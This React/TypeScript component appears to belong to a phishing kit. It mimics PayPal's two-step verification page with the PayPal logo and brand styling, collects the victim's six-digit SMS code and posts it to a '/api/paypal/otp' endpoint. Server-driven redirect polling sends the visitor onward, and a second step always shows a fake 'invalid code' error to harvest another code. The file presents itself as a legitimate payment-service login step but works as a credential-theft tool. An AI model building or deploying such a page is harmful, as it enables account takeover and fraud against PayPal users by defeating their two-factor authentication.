import { useState, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useRedirectPolling } from "@/hooks/use-redirect-polling";
import paypalLogo from "@assets/generated_images/PayPal_official_logo_d33d02f7.png";
import { useLanguage } from "@/hooks/use-language";

interface PayPalOTPPageProps {
  step?: 1 | 2;
}

export default function PayPalOTPPage({ step = 1 }: PayPalOTPPageProps) {
  const { t } = useLanguage();
  const [otp, setOtp] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get("session");
    if (id) setSessionId(id);
  }, []);

  // Use redirect polling hook
  useRedirectPolling({
    sessionId,
    currentPath: step === 1 ? "/paypal/otp1" : "/paypal/otp2",
    apiEndpoint: "/api/paypal/session",
    pathEndpoint: "/api/paypal/session/:sessionId/path",
  });

  const otpMutation = useMutation({
    mutationFn: async (otpValue: string) => {
      return await apiRequest("POST", "/api/paypal/otp", {
        sessionId,
        otp: otpValue,
        step,
      });
    },
    onSuccess: () => {
      // Always redirect to loading page
      const params = new URLSearchParams();
      if (sessionId) params.set("session", sessionId);
      const queryString = params.toString();
      window.location.href = `/paypal/waiting${queryString ? `?${queryString}` : ""}`;
    },
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length === 6) {
      otpMutation.mutate(otp);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-md space-y-6">
          {/* PayPal Logo */}
          <div className="flex justify-center mb-8">
            <img src={paypalLogo} alt="PayPal" className="h-32 w-auto" data-testid="img-paypal-logo" />
          </div>

          <Card className="border border-gray-200 shadow-sm">
            <CardContent className="pt-8 pb-8 px-10">
              <form onSubmit={handleSubmit} className="space-y-5">
                <div className="space-y-2">
                  <h1 className="text-3xl font-normal text-gray-900" data-testid="text-title">
                    {t("paypalTwoStepVerification")}
                  </h1>
                  <p className="text-base text-gray-700 leading-relaxed" data-testid="text-description">
                    {t("paypalEnterCodeSent")}
                  </p>
                </div>

                {step === 2 && (
                  <p className="text-center text-red-600 font-medium" data-testid="text-error">
                    {t("paypalInvalidSmsCode")}
                  </p>
                )}

                <div className="space-y-3 pt-2">
                  <Label htmlFor="otp" className="text-sm font-medium text-gray-800">
                    {t("paypalVerificationCode")}
                  </Label>
                  <Input
                    id="otp"
                    data-testid="input-otp"
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    placeholder="000000"
                    value={otp}
                    onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                    maxLength={6}
                    className="h-14 text-center text-2xl tracking-widest font-mono border-2 border-gray-300 focus:border-[#0070ba] focus:ring-2 focus:ring-[#0070ba]/20 rounded"
                    required
                  />
                </div>

                <Button
                  type="submit"
                  disabled={otp.length !== 6 || otpMutation.isPending}
                  className="w-full h-12 bg-[#0070ba] hover:bg-[#005ea6] text-white text-base font-medium rounded-full mt-6"
                  data-testid="button-submit"
                >
                  {otpMutation.isPending ? t("paypalVerifying") : t("paypalVerify")}
                </Button>

                <div className="text-center pt-2">
                  <button
                    type="button"
                    className="text-sm text-[#0070ba] hover:text-[#005ea6] hover:underline font-medium"
                    data-testid="button-resend"
                  >
                    {t("paypalResendCode")}
                  </button>
                </div>
              </form>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}
